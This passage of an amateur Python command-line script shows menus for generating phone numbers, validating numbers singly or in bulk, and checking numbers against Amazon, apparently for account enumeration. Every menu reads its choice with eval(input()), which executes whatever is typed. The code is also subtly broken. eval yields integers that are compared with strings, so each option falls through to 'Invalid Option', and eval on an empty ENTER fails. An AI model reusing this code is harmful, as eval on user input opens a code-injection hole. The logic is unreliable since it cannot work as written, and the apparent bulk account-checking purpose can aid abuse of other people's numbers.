            print((Style.BRIGHT + Fore.GREEN + "2. Check Bulk Number"))
            print("")
    
            ofical = eval(input("Enter the option(1 or 2) : "))
            print("")
    
            if ofical == "1":
                checkao()
            elif ofical == "2":
                aobulk()
            else:
                print((Style.BRIGHT + Fore.RED + "Invalid Option"))
                return fun3()
        fun3()

    elif optns == "1":
    
        def fun4():
            generate()
        fun4()
        
    elif optns == "2":
        def fun5():
            print((Style.BRIGHT + Fore.CYAN + "Validate Phone Numbers"))
            print((Style.BRIGHT + Fore.GREEN + "1. Validate Single Phone Number"))
            print((Style.BRIGHT + Fore.GREEN + "2. Validate Bulk Phone numbers"))
            print("")
    
            ofical = eval(input("Enter the option(1 or 2) : "))
            print("")
    
            if ofical == "1":
                main()
            elif ofical == "2":
                valbulk()
            else:
                print((Style.BRIGHT + Fore.RED + "Invalid Option"))
                return fun5()
        fun5()

    elif optns == "6":
        def fun6():
            print((Style.BRIGHT + Fore.CYAN + "Validate Amazon Phone Numbers"))
            print((Style.BRIGHT + Fore.GREEN + "1. Validate Single Phone Number"))
            print((Style.BRIGHT + Fore.GREEN + "2. Validate Bulk Phone numbers"))
            print("")
    
            ofical = eval(input("Enter the option(1 or 2) : "))
            print("")
    
            if ofical == "1":
                checkamaz()
            elif ofical == "2":
                amazbulk()
            else:
                print((Style.BRIGHT + Fore.RED + "Invalid Option"))
                return fun6()
        fun6()
        
    else:
        print((Style.BRIGHT + Fore.RED + "Invalid Option"))
heds()

ent = eval(input("Press 'ENTER' to exit."))